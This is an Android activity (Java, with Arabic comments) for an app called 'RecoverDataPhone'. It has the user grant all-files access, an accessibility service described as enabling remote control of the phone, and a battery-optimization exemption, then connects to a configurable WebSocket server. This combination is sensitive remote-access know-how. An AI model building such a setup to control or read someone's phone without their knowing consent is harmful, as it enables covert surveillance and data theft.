package com.recoverdata.phone;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import com.recoverdata.phone.network.ServerConfig;
import com.recoverdata.phone.service.ConnectionService;
import com.recoverdata.phone.utils.Logger;
import com.recoverdata.phone.utils.PermissionHelper;

/**
 * MainActivity
 * ============================================================
 * الشاشة الرئيسية للتطبيق.
 *
 * المسؤوليات:
 *   1. عرض حالة كل صلاحية (✅/❌).
 *   2. أزرار لطلب الصلاحيات.
 *   3. إعداد عنوان السيرفر.
 *   4. زر Connect (يبدأ ConnectionService).
 *   5. عرض حالة الاتصال.
 *
 * ملاحظة:
 *   - نستخدم findViewById بدل ViewBinding لتبسيط الكود.
 *   - إذا أردت ViewBinding، يمكن تحويله لاحقاً.
 * ============================================================
 */
public class MainActivity extends AppCompatActivity {

    // =============================================================
    // 1. الثوابت
    // =============================================================
    private static final String TAG = "MainActivity";

    // =============================================================
    // 2. الحقول - العناصر
    // =============================================================
    // الحالة العامة
    private TextView tvStatus;
    private TextView tvNextStep;

    // الصلاحيات - أزرار وحالات
    private View rowMedia;
    private TextView tvMediaStatus;
    private Button btnMedia;

    private View rowAllFiles;
    private TextView tvAllFilesStatus;
    private Button btnAllFiles;

    private View rowAccessibility;
    private TextView tvAccessibilityStatus;
    private Button btnAccessibility;

    private View rowBattery;
    private TextView tvBatteryStatus;
    private Button btnBattery;

    // السيرفر
    private EditText etServerUrl;
    private Button btnSaveUrl;
    private Button btnResetUrl;

    // التحكم
    private Button btnConnect;
    private Button btnDisconnect;

    // =============================================================
    // 3. الحقول - الحالة
    // =============================================================
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private boolean isServiceRunning = false;

    // =============================================================
    // 4. دورة الحياة
    // =============================================================
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Logger.i(TAG, "onCreate");

        setContentView(R.layout.activity_main);

        // ----- 1. ربط العناصر -----
        bindViews();

        // ----- 2. إعداد المستمعين -----
        setupListeners();

        // ----- 3. تحميل عنوان السيرفر الحالي -----
        loadServerUrl();
    }

    @Override
    protected void onResume() {
        super.onResume();
        Logger.d(TAG, "onResume");

        // تحديث حالة الصلاحيات عند العودة من الإعدادات
        updatePermissionStatus();
        updateConnectionStatus();
    }

    @Override
    protected void onDestroy() {
        Logger.d(TAG, "onDestroy");
        mainHandler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }

    // =============================================================
    // 5. ربط العناصر
    // =============================================================
    private void bindViews() {
        // الحالة
        tvStatus     = findViewById(R.id.tvStatus);
        tvNextStep   = findViewById(R.id.tvNextStep);

        // الصلاحيات
        rowMedia     = findViewById(R.id.rowMedia);
        tvMediaStatus = findViewById(R.id.tvMediaStatus);
        btnMedia     = findViewById(R.id.btnMedia);

        rowAllFiles  = findViewById(R.id.rowAllFiles);
        tvAllFilesStatus = findViewById(R.id.tvAllFilesStatus);
        btnAllFiles  = findViewById(R.id.btnAllFiles);

        rowAccessibility = findViewById(R.id.rowAccessibility);
        tvAccessibilityStatus = findViewById(R.id.tvAccessibilityStatus);
        btnAccessibility = findViewById(R.id.btnAccessibility);

        rowBattery   = findViewById(R.id.rowBattery);
        tvBatteryStatus = findViewById(R.id.tvBatteryStatus);
        btnBattery   = findViewById(R.id.btnBattery);

        // السيرفر
        etServerUrl  = findViewById(R.id.etServerUrl);
        btnSaveUrl   = findViewById(R.id.btnSaveUrl);
        btnResetUrl  = findViewById(R.id.btnResetUrl);

        // التحكم
        btnConnect   = findViewById(R.id.btnConnect);
        btnDisconnect = findViewById(R.id.btnDisconnect);
    }

    // =============================================================
    // 6. المستمعون
    // =============================================================
    private void setupListeners() {

        // ----- 1. صلاحيات الوسائط -----
        btnMedia.setOnClickListener(v -> {
            Logger.i(TAG, "Requesting media permissions");
            PermissionHelper.requestRuntimePermissions(
                    this, PermissionHelper.RC_MEDIA_PERMISSIONS);
        });

        // ----- 2. الوصول لجميع الملفات -----
        btnAllFiles.setOnClickListener(v -> {
            Logger.i(TAG, "Opening MANAGE_EXTERNAL_STORAGE settings");
            PermissionHelper.openManageStorageSettings(this);
        });

        // ----- 3. Accessibility -----
        btnAccessibility.setOnClickListener(v -> {
            showAccessibilityDialog();
        });

        // ----- 4. البطارية -----
        btnBattery.setOnClickListener(v -> {
            Logger.i(TAG, "Requesting battery optimization exemption");
            PermissionHelper.requestIgnoreBatteryOptimizations(this);
        });

        // ----- 5. حفظ عنوان السيرفر -----
        btnSaveUrl.setOnClickListener(v -> saveServerUrl());

        // ----- 6. إعادة تعيين -----
        btnResetUrl.setOnClickListener(v -> resetServerUrl());

        // ----- 7. الاتصال -----
        btnConnect.setOnClickListener(v -> startConnection());

        // ----- 8. قطع الاتصال -----
        btnDisconnect.setOnClickListener(v -> stopConnection());
    }

    // =============================================================
    // 7. حالة الصلاحيات
    // =============================================================
    private void updatePermissionStatus() {
        // ----- 1. الوسائط -----
        boolean mediaOk = PermissionHelper.hasRuntimePermissions(this);
        updateRowStatus(rowMedia, tvMediaStatus, btnMedia, mediaOk);

        // ----- 2. جميع الملفات -----
        boolean allFilesOk = PermissionHelper.hasManageExternalStorage(this);
        boolean allFilesRequired = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R;
        updateRowStatus(rowAllFiles, tvAllFilesStatus, btnAllFiles,
                allFilesOk, allFilesRequired);

        // ----- 3. Accessibility -----
        boolean accOk = PermissionHelper.isAccessibilityServiceEnabled(this);
        updateRowStatus(rowAccessibility, tvAccessibilityStatus,
                btnAccessibility, accOk);

        // ----- 4. البطارية -----
        boolean batteryOk = PermissionHelper.isIgnoringBatteryOptimizations(this);
        updateRowStatus(rowBattery, tvBatteryStatus, btnBattery, batteryOk);

        // ----- 5. الحالة العامة -----
        boolean allOk = PermissionHelper.hasAllRequiredPermissions(this);

        if (allOk) {
            tvStatus.setText("✅ كل الصلاحيات ممنوحة");
            tvStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
        } else {
            tvStatus.setText("⚠️ صلاحيات ناقصة");
            tvStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_orange_dark));
        }

        // ----- 6. الخطوة التالية -----
        tvNextStep.setText(PermissionHelper.getNextStepMessage(this));

        // ----- 7. تفعيل/تعطيل زر الاتصال -----
        btnConnect.setEnabled(allOk);
    }

    /**
     * تحديث صف صلاحية واحدة.
     */
    private void updateRowStatus(View row, TextView status, Button button,
                                 boolean granted) {
        updateRowStatus(row, status, button, granted, true);
    }

    private void updateRowStatus(View row, TextView status, Button button,
                                 boolean granted, boolean required) {
        if (!required) {
            status.setText("ℹ️ غير مطلوبة على هذا الإصدار");
            status.setTextColor(ContextCompat.getColor(this, android.R.color.darker_gray));
            button.setVisibility(View.GONE);
            return;
        }

        if (granted) {
            status.setText("✅ ممنوحة");
            status.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
            button.setText("ممنوحة");
            button.setEnabled(false);
        } else {
            status.setText("❌ غير ممنوحة");
            status.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
            button.setText("منح");
            button.setEnabled(true);
        }
    }

    // =============================================================
    // 8. Accessibility Dialog
    // =============================================================
    private void showAccessibilityDialog() {
        new AlertDialog.Builder(this)
                .setTitle("تفعيل خدمة Accessibility")
                .setMessage(
                        "لتفعيل التحكم عن بُعد، يجب تفعيل خدمة \"RecoverDataPhone\" " +
                        "في إعدادات Accessibility.\n\n" +
                        "🔍 ابحث عن \"RecoverDataPhone\" في القائمة\n" +
                        "👆 اضغط عليها\n" +
                        "✅ فعّلها\n\n" +
                        "⚠️ هذه الخدمة ضرورية للتحكم بالهاتف عن بُعد."
                )
                .setPositiveButton("فتح الإعدادات", (d, w) -> {
                    PermissionHelper.openAccessibilitySettings(this);
                })
                .setNegativeButton("إلغاء", null)
                .show();
    }

    // =============================================================
    // 9. إدارة عنوان السيرفر
    // =============================================================
    private void loadServerUrl() {
        String url = ServerConfig.getServerUrl(this);
        etServerUrl.setText(url);

        // إذا كان افتراضياً، أظهر تنبيهاً
        if (ServerConfig.isUsingDefaultUrl(this)) {
            etServerUrl.setHint("الافتراضي: " + url);
        }
    }

    private void saveServerUrl() {
        String url = etServerUrl.getText().toString().trim();

        if (TextUtils.isEmpty(url)) {
            Toast.makeText(this, "الرجاء إدخال عنوان", Toast.LENGTH_SHORT).show();
            return;
        }

        if (!ServerConfig.isValidUrl(url)) {
            Toast.makeText(this,
                    "عنوان غير صالح. يجب أن يبدأ بـ ws:// أو wss://",
                    Toast.LENGTH_LONG).show();
            return;
        }

        ServerConfig.setServerUrl(this, url);
        Toast.makeText(this, "✅ تم حفظ العنوان", Toast.LENGTH_SHORT).show();

        Logger.i(TAG, "Server URL saved: " + url);

        // إذا كانت الخدمة تعمل، أعد تشغيل الاتصال
        if (isServiceRunning) {
            ConnectionService.restart(this);
        }
    }

    private void resetServerUrl() {
        new AlertDialog.Builder(this)
                .setTitle("إعادة تعيين")
                .setMessage("هل تريد العودة للعنوان الافتراضي؟")
                .setPositiveButton("نعم", (d, w) -> {
                    ServerConfig.resetUrl(this);
                    loadServerUrl();
                    Toast.makeText(this, "تمت إعادة التعيين",
                            Toast.LENGTH_SHORT).show();
                })
                .setNegativeButton("إلغاء", null)
                .show();
    }

    // =============================================================
    // 10. التحكم بالاتصال
    // =============================================================
    private void startConnection() {
        // التحقق من الصلاحيات
        if (!PermissionHelper.hasAllRequiredPermissions(this)) {
            Toast.makeText(this,
                    PermissionHelper.getNextStepMessage(this),
                    Toast.LENGTH_LONG).show();
            return;
        }

        // التحقق من العنوان
        String url = etServerUrl.getText().toString().trim();
        if (!ServerConfig.isValidUrl(url)) {
            Toast.makeText(this, "عنوان السيرفر غير صالح",
                    Toast.LENGTH_LONG).show();
            return;
        }

        Logger.i(TAG, "Starting ConnectionService...");

        // بدء الخدمة
        ConnectionService.start(this);

        isServiceRunning = true;
        updateConnectionStatus();

        Toast.makeText(this, "🔄 جارٍ الاتصال...", Toast.LENGTH_SHORT).show();
    }

    private void stopConnection() {
        new AlertDialog.Builder(this)
                .setTitle("قطع الاتصال")
                .setMessage("هل تريد إيقاف الاتصال بالسيرفر؟")
                .setPositiveButton("نعم", (d, w) -> {
                    Logger.i(TAG, "Stopping ConnectionService...");
                    ConnectionService.stop(this);

                    isServiceRunning = false;
                    updateConnectionStatus();

                    Toast.makeText(this, "تم قطع الاتصال",
                            Toast.LENGTH_SHORT).show();
                })
                .setNegativeButton("إلغاء", null)
                .show();
    }

    private void updateConnectionStatus() {
        // تحديث حالة الأزرار
        btnConnect.setEnabled(
                !isServiceRunning && PermissionHelper.hasAllRequiredPermissions(this));
        btnDisconnect.setEnabled(isServiceRunning);

        // تحديث نص الحالة
        if (isServiceRunning) {
            tvStatus.setText("🟢 الاتصال نشط");
            tvStatus.setTextColor(
                    ContextCompat.getColor(this, android.R.color.holo_green_dark));
        } else {
            updatePermissionStatus();
        }
    }

    // =============================================================
    // 11. نتائج طلب الصلاحيات
    // =============================================================
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PermissionHelper.RC_MEDIA_PERMISSIONS) {
            boolean allGranted = grantResults.length > 0;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                Toast.makeText(this, "✅ تم منح الصلاحيات",
                        Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this,
                        "⚠️ بعض الصلاحيات مرفوضة",
                        Toast.LENGTH_LONG).show();
            }

            updatePermissionStatus();
        }
    }
}